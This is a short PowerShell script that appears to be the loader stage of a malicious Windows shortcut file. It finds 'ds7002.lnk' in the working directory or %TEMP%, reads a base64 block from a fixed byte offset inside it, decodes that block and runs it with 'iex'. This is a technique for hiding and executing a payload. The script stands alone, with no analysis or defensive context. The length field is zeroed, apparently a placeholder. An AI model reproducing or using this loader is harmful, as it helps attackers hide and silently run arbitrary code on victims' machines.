$script_start_byte = 0x0005e2be
$script_length = 0000;
$filename = "ds7002.lnk"

if (-not(Test-Path $filename))
{
$val = Get-ChildItem -Path $Env:temp -Filter $filename -Recurse;
if (-not $val)
{
exit
}
[IO.Directory]::SetCurrentDirectory($val.DirectoryName);
}
$filestream = New-Object IO.FileStream $filename,'Open','Read','ReadWrite';
$val = New-Object byte[]($script_length);
$r = $filestream.Seek($script_start_byte,[IO.SeekOrigin]::Begin);
$r = $filestream.Read($val,0,$script_length);
$val = [Convert]::FromBase64CharArray($val,0,$val.Length);
$string = [Text.Encoding]::ASCII.GetString($val);
iex $string;